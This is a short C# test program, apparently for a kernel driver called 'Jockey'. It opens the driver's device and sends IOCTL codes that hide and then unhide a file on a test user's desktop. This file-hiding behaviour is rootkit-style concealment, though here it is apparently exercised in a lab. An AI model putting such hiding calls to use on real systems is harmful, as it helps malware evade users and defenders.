using System;
using System.Runtime.InteropServices;
using System.Text;

public class T3b {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateFile(string f, uint a, uint s, IntPtr sa, uint c, uint fl, IntPtr h);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool DeviceIoControl(IntPtr h, uint c, byte[] i, uint il, byte[] o, uint ol, out uint r, IntPtr p);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr h);

    public static int Run() {
        IntPtr h = CreateFile(@"\\.\Jockey", 0xC0000000, 0, IntPtr.Zero, 3, 0, IntPtr.Zero);
        if ((long)h == -1) { Console.WriteLine("open fail: " + Marshal.GetLastWin32Error()); return 1; }
        uint r = 0;

        // struct jky_req_file { wchar_t path[260]; ULONG flags; } = 524 bytes
        byte[] f = new byte[260 * 2 + 4];
        byte[] pathBytes = Encoding.Unicode.GetBytes(@"C:\Users\ExploitME\Desktop\hola.txt" + "\0");
        Array.Copy(pathBytes, 0, f, 0, Math.Min(pathBytes.Length, 260 * 2));

        bool ok = DeviceIoControl(h, 0x8000200C, f, (uint)f.Length, null, 0, out r, IntPtr.Zero);
        Console.WriteLine("HIDE_FILE: " + (ok ? "OK" : "FAIL") + " err=" + Marshal.GetLastWin32Error());

        ok = DeviceIoControl(h, 0x80002010, f, (uint)f.Length, null, 0, out r, IntPtr.Zero);
        Console.WriteLine("UNHIDE_FILE: " + (ok ? "OK" : "FAIL") + " err=" + Marshal.GetLastWin32Error());

        CloseHandle(h);
        return 0;
    }
}
